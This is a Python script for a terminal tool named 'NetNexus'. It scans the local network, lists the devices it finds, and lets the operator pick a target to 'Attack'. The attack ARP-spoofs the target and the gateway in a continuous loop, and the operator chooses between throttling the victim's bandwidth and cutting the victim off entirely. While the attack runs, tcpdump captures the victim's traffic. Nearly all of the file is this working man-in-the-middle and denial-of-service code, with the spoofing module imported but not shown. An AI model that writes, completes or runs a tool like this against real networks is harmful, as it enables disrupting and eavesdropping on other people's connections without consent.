import scapy.all as scapy
import os, time, sys, subprocess, threading
from core import scanner, spoof, shaper

device_memory = {}
stop_scanner = False

def open_monitor(target_ip, iface):
    cmd = f"sudo tcpdump -i {iface} host {target_ip}"
    terminals = [
        ['alacritty', '-e', 'sh', '-c', cmd],
        ['gnome-terminal', '--', 'sh', '-c', cmd],
        ['xfce4-terminal', '-e', f"sh -c '{cmd}'"],
        ['konsole', '-e', 'sh', '-c', cmd],
        ['xterm', '-e', 'sh', '-c', cmd]
    ]
    for term in terminals:
        try:
            subprocess.Popen(term, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except FileNotFoundError:
            continue
    return False

def set_forwarding(state):
    if state:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=0"], capture_output=True)
    else:
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)

def background_scanner(ip_range):
    global device_memory, stop_scanner
    while not stop_scanner:
        scanner.scan(ip_range, device_memory)
        time.sleep(1)

def main():
    global device_memory, stop_scanner
    iface = scapy.conf.iface
    if os.getuid() != 0:
        print("[-] Root required.")
        return
    gateway_ip = "192.168.8.1"
    ip_range = f"{gateway_ip}/24"
    threading.Thread(target=background_scanner, args=(ip_range,), daemon=True).start()
    while True:
        os.system('clear')
        print("="*60)
        print("          NetNexus (Threaded Scan)")
        print("="*60)
        print("ID\tIP\t\tMAC\t\t\tNAME")
        print("-" * 60)
        snapshot = list(device_memory.values())
        for i, dev in enumerate(snapshot):
            print(f"{i}\t{dev['ip']}\t{dev['mac']}\t{dev['name']}")
        print("-" * 60)
        print("Commands: [ID] Attack | [Enter] Refresh | [q] Quit")
        choice = input("\nChoice: ").lower().strip()
        if choice == '': continue
        if choice == 'q':
            stop_scanner = True
            break
        try:
            target = snapshot[int(choice)]
            print(f"\n[1] Limit (kbps)  [2] Kill")
            mode = input("Action: ")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            if mode == "1":
                kbps = input("kbps: ")
                set_forwarding(True)
                shaper.apply_limit(iface, kbps)
                wait_time = 0.5
            elif mode == "2":
                set_forwarding(False)
                wait_time = 0.05
            else: continue
            open_monitor(target['ip'], iface)
            print(f"[*] Active... Ctrl+C to Stop.")
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time)
        except (KeyboardInterrupt, ValueError, IndexError):
            set_forwarding(True)
            shaper.reset_shaper(iface)
            spoof.restore(target['ip'], gateway_ip)
            time.sleep(0.5)
            continue

if __name__ == "__main__":
    main()
